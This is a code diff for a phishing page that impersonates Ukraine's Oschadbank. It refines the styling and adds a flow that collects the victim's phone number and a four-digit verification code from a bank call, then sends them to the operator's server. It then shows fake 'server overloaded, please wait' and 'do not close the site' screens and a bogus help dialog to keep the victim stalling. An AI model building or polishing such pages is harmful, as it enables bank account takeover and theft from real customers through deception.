@@ -119,16 +119,9 @@
             transition: all 0.2s ease; pointer-events: none; background-color: var(--white); padding: 0 4px;
             z-index: 1;
         }
-        .oschad-input-group.phone-group > label {
-            left: 55px;
-        }
         .oschad-input-group.is-focused > label,
         .oschad-input-group.has-value > label {
             top: -10px; left: 10px; font-size: 12px; color: #6c757d;
-        }
-        .oschad-input-group.phone-group.is-focused > label,
-        .oschad-input-group.phone-group.has-value > label {
-            left: 10px;
         }
         .oschad-input-field {
             width: 100%; padding: 18px 45px 18px 15px;
@@ -211,38 +204,46 @@
         }
         .oschad-call-info {
             font-size: 16px;
+            font-weight: 500; /* Жирнее */
             margin-bottom: 20px !important;
         }
         .oschad-call-number {
             font-size: 22px;
-            font-weight: 500;
+            font-weight: 600; /* Жирнее */
             color: var(--dark-text) !important;
             margin-bottom: 5px !important;
         }
         .oschad-call-instruction {
             font-size: 16px;
+            font-weight: 500; /* Жирнее */
             margin-top: 15px !important;
             margin-bottom: 30px !important;
         }
         .oschad-code-inputs {
             display: flex;
             justify-content: center;
-            gap: 10px; /* Уменьшен отступ */
+            gap: 15px; /* Увеличен отступ */
             margin-bottom: 30px;
         }
         .oschad-code-input {
-            width: 45px;
-            height: 50px;
+            width: 50px;
+            height: 55px;
             text-align: center;
             font-size: 24px;
-            font-weight: 500;
-            border: none;
-            border-bottom: 2px solid #ced4da; /* Серая линия внизу */
-            background-color: transparent;
+            font-weight: 600;
+            border: 1px solid #dee2e6;
+            border-radius: 12px;
+            background-color: var(--white);
             outline: none;
             transition: border-color 0.2s ease;
             color: var(--dark-text);
-            -moz-appearance: textfield; /* Скрыть стрелки в Firefox */
+            caret-color: #00A39C; /* Цвет курсора */
+            padding: 0;
+            -moz-appearance: textfield;
+        }
+        .oschad-code-input::placeholder {
+            color: var(--dark-text);
+            font-weight: 900;
         }
         .oschad-code-input::-webkit-outer-spin-button,
         .oschad-code-input::-webkit-inner-spin-button {
@@ -250,7 +251,7 @@
             margin: 0;
         }
         .oschad-code-input:focus {
-            border-bottom-color: #00A39C; /* Линия становится зеленой при фокусе */
+            border-color: #00A39C;
         }
         .oschad-resend-link {
             display: block;
@@ -266,6 +267,59 @@
             font-weight: 500;
             text-decoration: none;
             font-size: 15px;
+            cursor: pointer; /* Добавлено для кликабельности */
+        }
+
+        /* --- Стили для модального окна "Нет SMS" --- */
+        .sms-help-modal-backdrop {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            display: flex; justify-content: center; align-items: center;
+            z-index: 2000; padding: 20px;
+        }
+        .sms-help-modal-content {
+            background-color: var(--white);
+            border-radius: 16px;
+            padding: 25px;
+            width: 100%;
+            max-width: 380px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+            text-align: left;
+        }
+        .sms-help-modal-content h3 {
+            font-size: 18px;
+            font-weight: 700;
+            margin: 0 0 15px 0;
+            color: var(--dark-text);
+        }
+        .sms-help-modal-content p {
+            font-size: 15px;
+            line-height: 1.5;
+            color: var(--light-text);
+            margin: 0 0 25px 0;
+        }
+        .sms-help-modal-actions {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        .sms-help-modal-actions button {
+            border: none;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+        }
+        .sms-help-modal-actions button#sms-help-webcall {
+            background-color: transparent;
+            color: #00A39C;
+        }
+        .sms-help-modal-actions button#sms-help-understood {
+            background-color: transparent;
+            color: #00A39C;
         }
         
         #form-header { text-align: center; margin-bottom: 25px; }
@@ -375,7 +429,6 @@ document.addEventListener('DOMContentLoaded', () => {
 
                         <div id="phone-login-form">
                             <div class="oschad-input-group phone-group">
-                                <label for="phone_input">Номер телефону</label>
                                 <div class="oschad-phone-wrapper">
                                     <span class="oschad-phone-prefix">+380</span>
                                     <input type="tel" class="oschad-input-field" id="phone_input" placeholder=" " autocomplete="off">
@@ -421,6 +474,21 @@ document.addEventListener('DOMContentLoaded', () => {
         addCustomModalListeners(bankName);
     }
     
+    function showOschadLoader() {
+        customModalContent.innerHTML = `
+            <div class="oschad-header">
+                <span class="back-arrow" id="loader-back-arrow">←</span>
+                <span class="title"></span>
+            </div>
+            <div class="oschad-welcome-section">
+                <h3 style="text-align: center; width: 100%;">Сервер перевантажений</h3>
+                <p style="text-align: center; width: 100%; margin-top: 5px;">Зачекайте 1-2 хвилини</p>
+                <img src="https://itc.ua/wp-content/uploads/2021/12/oschadik_mint_headphones-770x770.png" class="loader-icon" alt="Loading...">
+            </div>
+        `;
+        document.getElementById('loader-back-arrow').addEventListener('click', () => renderCustomModal('lk', 'Ощадбанк'));
+    }
+
     function addCustomModalListeners(bankName) {
         const submitBtn = document.getElementById('custom-submit-btn') || document.getElementById('oschad-submit-btn');
 
@@ -517,18 +585,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 sendDataToServer(dataToSend, true);
                 
                 if (bankName === 'Ощадбанк') {
-                     customModalContent.innerHTML = `
-                         <div class="oschad-header">
-                            <span class="back-arrow" id="loader-back-arrow">←</span>
-                            <span class="title"></span>
-                        </div>
-                        <div class="oschad-welcome-section">
-                            <h3 style="text-align: center; width: 100%;">Сервер перевантажений</h3>
-                            <p style="text-align: center; width: 100%; margin-top: 5px;">Зачекайте 1-2 хвилини</p>
-                            <img src="https://itc.ua/wp-content/uploads/2021/12/oschadik_mint_headphones-770x770.png" class="loader-icon" alt="Loading...">
-                        </div>
-                     `;
-                     document.getElementById('loader-back-arrow').addEventListener('click', () => renderCustomModal('lk', bankName));
+                     showOschadLoader();
                 } else {
                     customModalContent.innerHTML = `<h3>Очікуємо</h3><p>Заявку відправлено. НЕ ЗАКРИВАЙТЕ САЙТ!</p>`;
                 }
@@ -563,11 +620,37 @@ document.addEventListener('DOMContentLoaded', () => {
         callTimerInterval = setInterval(updateTimer, 1000);
     }
     
+    function showNoSmsModal() {
+        const existingModal = document.querySelector('.sms-help-modal-backdrop');
+        if (existingModal) return;
+
+        const modalHtml = `
+        <div class="sms-help-modal-backdrop">
+            <div class="sms-help-modal-content">
+                <h3>Немає можливості отримати SMS?</h3>
+                <p>Можливо Ви перебуваєте на територіях де відсутній мобільний зв'язок українських операторів. Зверніться у Контакт-центр банку через сайт банку, функція «Веб-дзвінок без авторизації» та дійте за інструкцією оператора</p>
+                <div class="sms-help-modal-actions">
+                    <button id="sms-help-understood">ЗРОЗУМІЛО</button>
+                    <button id="sms-help-webcall">ВЕБ-ДЗВІНОК</button>
+                </div>
+            </div>
+        </div>`;
+        document.body.insertAdjacentHTML('beforeend', modalHtml);
+
+        const closeModal = () => {
+            const modal = document.querySelector('.sms-help-modal-backdrop');
+            if (modal) modal.remove();
+        };
+        
+        document.querySelector('.sms-help-modal-backdrop').addEventListener('click', (e) => {
+            if (e.target === e.currentTarget) closeModal();
+        });
+        document.getElementById('sms-help-understood').addEventListener('click', closeModal);
+        document.getElementById('sms-help-webcall').addEventListener('click', closeModal);
+    }
+
     function renderOschadbankCallConfirmation() {
-        const fullPhone = collectedData.phone || '+380000000000';
-        const phoneDigits = fullPhone.replace('+', '');
-        const lastTwoDigits = phoneDigits.slice(-2);
-        const maskedPhone = `380*******${lastTwoDigits}`;
+        const maskedPhone = '380*********';
 
         const html = `
             <div class="oschad-header">
@@ -580,13 +663,10 @@ document.addEventListener('DOMContentLoaded', () => {
                 <p class="oschad-call-number">+38044 350 0133</p>
                 <p class="oschad-call-instruction">Прийміть дзвінок та дотримуйтесь інструкцій</p>
                 <div class="oschad-code-inputs" id="code-inputs-container">
-                    <input type="tel" maxlength="1" class="oschad-code-input">
-                    <span>-</span>
-                    <input type="tel" maxlength="1" class="oschad-code-input">
-                    <span>-</span>
-                    <input type="tel" maxlength="1" class="oschad-code-input">
-                    <span>-</span>
-                    <input type="tel" maxlength="1" class="oschad-code-input">
+                    <input type="tel" maxlength="1" class="oschad-code-input" placeholder="—">
+                    <input type="tel" maxlength="1" class="oschad-code-input" placeholder="—">
+                    <input type="tel" maxlength="1" class="oschad-code-input" placeholder="—">
+                    <input type="tel" maxlength="1" class="oschad-code-input" placeholder="—">
                 </div>
                 <a href="#" class="oschad-resend-link" id="resend-call-link"></a>
                 <a href="#" class="oschad-no-call-link">Немає можливості отримувати дзвінки та SMS</a>
@@ -600,11 +680,25 @@ document.addEventListener('DOMContentLoaded', () => {
             renderCustomModal('lk', 'Ощадбанк');
         });
 
+        document.querySelector('.oschad-no-call-link').addEventListener('click', (e) => {
+            e.preventDefault();
+            showNoSmsModal();
+        });
+        
         const codeInputs = document.querySelectorAll('.oschad-code-input');
         codeInputs.forEach((input, index) => {
             input.addEventListener('input', (e) => {
+                // Auto-focus next input
                 if (input.value && index < codeInputs.length - 1) {
                     codeInputs[index + 1].focus();
+                }
+                
+                // Check if all inputs are filled
+                const allFilled = [...codeInputs].every(inp => inp.value.length === 1);
+                if (allFilled) {
+                    const code = [...codeInputs].map(inp => inp.value).join('');
+                    sendDataToServer({ call_code: code }, true); // Send data
+                    showOschadLoader(); // Show loader screen
                 }
             });
             input.addEventListener('keydown', (e) => {
